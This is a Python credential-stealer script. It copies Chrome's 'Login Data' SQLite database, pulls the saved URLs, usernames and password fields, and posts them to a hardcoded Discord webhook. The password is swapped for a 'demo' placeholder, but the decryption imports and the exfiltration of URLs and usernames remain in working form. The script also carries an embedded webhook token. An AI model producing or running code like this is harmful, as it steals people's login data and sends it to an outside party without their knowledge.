import os
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import base64
import json
import shutil
import requests

# Discord webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1329177391569960960/RvhhUXLhcoXBppbx7Qxo7RFu7Avx6x1wh93PFF9fqzZVgOa_42l4c5J1D-_cLFm_P77o"

def get_chrome_pass():
    # Path to the Login Data file
    chrome_path = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Default\Login Data')
    temp_path = os.path.join(os.environ['TEMP'], 'LoginDataCopy.db')

    if not os.path.exists(chrome_path):
        print("Chrome Login Data file not found.")
        return []

    # Copy the database to avoid locking issues
    shutil.copy2(chrome_path, temp_path)

    # Connect to the SQLite database
    conn = sqlite3.connect(temp_path)
    cursor = conn.cursor()

    # Query the database
    cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
    results = []

    for row in cursor.fetchall():
        url = row[0]
        username = row[1]

        # Replace the decrypted password with a placeholder
        decrypted_password = "This is a secret for demo"

        results.append(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n{'-'*20}")

    conn.close()
    os.remove(temp_path)

    return results

def send_to_webhook(data):
    """Send the collected data to the Discord webhook."""
    payload = {
        "content": "Extracted Chrome Credentials",
        "embeds": [
            {
                "title": "Chrome Login Data",
                "description": "\n".join(data)[:2000],  # Discord embeds have a 2000-character limit
                "color": 16711680  # Red color
            }
        ]
    }
    response = requests.post(WEBHOOK_URL, json=payload)
    if response.status_code == 204:
        print("Data sent successfully to the webhook!")
    else:
        print(f"Failed to send data. HTTP {response.status_code}: {response.text}")

if __name__ == "__main__":
    credentials = get_chrome_pass()
    if credentials:
        send_to_webhook(credentials)
        print("Credentials processed and sent to webhook.")
    else:
        print("No credentials found.")
